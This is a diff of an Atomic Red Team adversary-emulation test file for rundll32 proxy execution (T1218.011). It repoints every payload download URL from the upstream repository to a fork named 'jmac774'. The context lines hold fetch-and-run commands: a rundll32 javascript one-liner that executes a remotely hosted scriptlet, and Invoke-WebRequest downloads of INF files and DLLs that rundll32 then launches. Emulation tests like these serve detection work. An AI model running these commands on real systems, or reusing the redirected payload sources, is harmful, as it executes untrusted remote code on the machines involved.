@@ -14,7 +14,7 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct
+      default: https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1218.011/src/T1218.011.sct
   executor:
     command: |
       rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
@@ -59,7 +59,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
@@ -86,7 +86,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1218.011/src/T1218.011.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
@@ -112,7 +112,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 #{inf_to_execute}
@@ -138,7 +138,7 @@ atomic_tests:
       if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
+      Invoke-WebRequest "https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1218.011/src/T1218.011_DefaultInstall.inf" -OutFile "#{inf_to_execute}"
   executor:
     command: |
       rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 #{inf_to_execute}
@@ -184,7 +184,7 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: Url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      default: https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1047/bin/calc.dll
     input_file:
       description: Non-dll file
       type: String
@@ -212,7 +212,7 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: Url
-      default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
+      default: https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1218.010/bin/AllTheThingsx64.dll
     input_file:
       description: DLL File
       type: String
@@ -239,7 +239,7 @@ atomic_tests:
     input_url:
       description: Url to download the DLL
       type: Url
-      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      default: https://github.com/jmac774/atomic-red-team/raw/safe/atomics/T1047/bin/calc.dll
     input_file:
       description: DLL File
       type: String
